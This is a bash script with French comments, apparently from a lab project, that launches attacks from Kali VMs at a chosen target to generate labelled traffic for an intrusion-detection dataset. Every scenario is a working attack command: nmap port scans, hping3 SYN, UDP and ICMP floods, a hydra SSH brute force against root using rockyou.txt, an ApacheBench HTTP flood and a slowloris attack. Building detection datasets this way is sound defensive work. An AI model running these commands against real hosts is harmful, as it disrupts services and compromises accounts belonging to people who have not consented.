#!/usr/bin/env bash
#
# Simule une attaque reseau depuis une VM Kali, pendant une duree fixe,
# pour alimenter capture_session.py qui tourne en parallele sur l'hote.
#
# UTILISATION
#   sudo ./attack_launcher.sh <scenario> <cible> <duree_s> [args supplementaires]
#
# EXEMPLE (sur 192.168.148.139, cible = hote Windows)
#   sudo ./attack_launcher.sh port_scan   192.168.148.1 90
#   sudo ./attack_launcher.sh udp_scan    192.168.148.1 90
#   sudo ./attack_launcher.sh syn_flood   192.168.148.1 25
#   sudo ./attack_launcher.sh udp_flood   192.168.148.1 25
#   sudo ./attack_launcher.sh icmp_flood  192.168.148.1 90
#   sudo ./attack_launcher.sh brute_force 192.168.148.1 240 ssh root
#   sudo ./attack_launcher.sh http_flood  192.168.148.1 30
#   sudo ./attack_launcher.sh slowloris   192.168.148.1 90
#
# PREREQUIS POUR http_flood ET slowloris (a installer une fois sur Kali)
#   sudo apt install apache2-utils slowhttptest
#
# POURQUOI PAS --rand-source SUR hping3
#   Le nettoyage (clean_dataset.py) reconnait l'attaque a partir de l'IP
#   source reelle de tes VM Kali. Usurper la source casserait l'etiquetage
#   -- a eviter ici, meme si c'est une option classique de hping3.
#
# DUREE CONSEILLEE (a adapter, lance capture_session.py avec la MEME valeur
# de --duration cote hote, puis demarre ce script juste apres)
#   benign        : pas d'attaque -> laisse tourner du trafic normal (voir
#                   la fonction benign() plus bas, optionnelle)
#   port_scan     : 60-120s   (nmap plein port TCP prend du temps)
#   udp_scan      : 60-120s
#   syn_flood     : 20-30s    (genere deja des dizaines de milliers de flux)
#   udp_flood     : 20-30s
#   icmp_flood    : 60-120s   (relance en parallele depuis l'autre VM Kali
#                   pour avoir aussi des flux Kali<->Kali, pas seulement
#                   Kali->hote)
#   brute_force   : 180-300s  (hydra teste les mots de passe un par un)
#   http_flood    : 20-30s    (ab genere tres vite un grand nombre de requetes)
#   slowloris     : 60-120s   (attaque lente par nature, needs du temps pour
#                   que l'effet d'epuisement de connexions soit visible)

set -euo pipefail

SCENARIO="${1:-}"
TARGET="${2:-}"
DURATION="${3:-}"

usage() {
    echo "Usage: sudo $0 <scenario> <cible> <duree_s> [args]"
    echo "Scenarios : port_scan | udp_scan | syn_flood | udp_flood | icmp_flood | brute_force | http_flood | slowloris | benign"
    exit 1
}

[[ -z "$SCENARIO" || -z "$TARGET" || -z "$DURATION" ]] && usage

echo "============================================================"
echo "ATTAQUE : $SCENARIO -> $TARGET  (${DURATION}s)"
echo "============================================================"

case "$SCENARIO" in

    port_scan)
        # SYN scan sur tous les ports TCP. --min-rate force le debit pour
        # couvrir les 65535 ports dans la duree impartie.
        timeout "$DURATION" nmap -sS -T4 --min-rate 3000 -p- "$TARGET" || true
        ;;

    udp_scan)
        # Scan UDP sur les 100 ports les plus courants (un scan UDP complet
        # est beaucoup trop lent pour une session de capture).
        timeout "$DURATION" nmap -sU -T4 --top-ports 100 "$TARGET" || true
        ;;

    syn_flood)
        # Flood de paquets SYN vers le port 80. Genere un tres grand nombre
        # de flux en quelques secondes : garde une duree courte.
        timeout "$DURATION" hping3 -S -p 80 --flood "$TARGET" || true
        ;;

    udp_flood)
        # Flood UDP vers le port 53 (DNS). Meme remarque que syn_flood.
        timeout "$DURATION" hping3 --udp -p 53 --flood "$TARGET" || true
        ;;

    icmp_flood)
        # Flood ICMP (ping flood). Lance ce meme script simultanement
        # depuis ta deuxieme VM Kali vers l'hote (et/ou vers l'autre VM)
        # si tu veux aussi des flux Kali<->Kali dans ce scenario.
        timeout "$DURATION" hping3 --icmp --flood "$TARGET" || true
        ;;

    brute_force)
        # Brute force SSH. Necessite un serveur SSH actif sur la cible.
        # args optionnels : <service> <utilisateur>  (defaut: ssh root)
        SERVICE="${4:-ssh}"
        USER="${5:-root}"
        WORDLIST="/usr/share/wordlists/rockyou.txt"
        if [[ ! -f "$WORDLIST" ]]; then
            echo "[ERREUR] $WORDLIST introuvable (gunzip rockyou.txt.gz ou adapte le chemin)."
            exit 1
        fi
        timeout "$DURATION" hydra -l "$USER" -P "$WORDLIST" -t 4 -f "$SERVICE://$TARGET" || true
        ;;

    http_flood)
        # Flood HTTP (couche applicative) : beaucoup de requetes GET
        # completes, contrairement a syn_flood qui ne va jamais au-dela
        # du SYN. -t fixe directement la duree, pas besoin de `timeout`.
        if ! command -v ab >/dev/null; then
            echo "[ERREUR] ab (ApacheBench) introuvable. sudo apt install apache2-utils"
            exit 1
        fi
        ab -c 50 -t "$DURATION" "http://$TARGET/" || true
        ;;

    slowloris)
        # Attaque lente : ouvre beaucoup de connexions HTTP et les maintient
        # ouvertes en envoyant des en-tetes au compte-gouttes, pour epuiser
        # le pool de connexions du serveur. -l fixe la duree du test.
        if ! command -v slowhttptest >/dev/null; then
            echo "[ERREUR] slowhttptest introuvable. sudo apt install slowhttptest"
            exit 1
        fi
        slowhttptest -c 1000 -H -i 10 -r 200 -t GET \
            -u "http://$TARGET/" -x 24 -p 3 -l "$DURATION" \
            -o "/tmp/slowloris_${TARGET}_$(date +%s)" || true
        ;;

    benign)
        # Trafic "normal" genere automatiquement (optionnel -- une vraie
        # session benign capturee pendant un usage normal de la machine
        # est preferable, celle-ci sert surtout a boucher les trous).
        END=$((SECONDS + DURATION))
        while [[ $SECONDS -lt $END ]]; do
            ping -c 1 -W 1 "$TARGET" >/dev/null 2>&1 || true
            curl -s -m 2 "http://$TARGET" >/dev/null 2>&1 || true
            nslookup example.com >/dev/null 2>&1 || true
            sleep 2
        done
        ;;

    *)
        usage
        ;;
esac

echo "------------------------------------------------------------"
echo "[OK] $SCENARIO termine."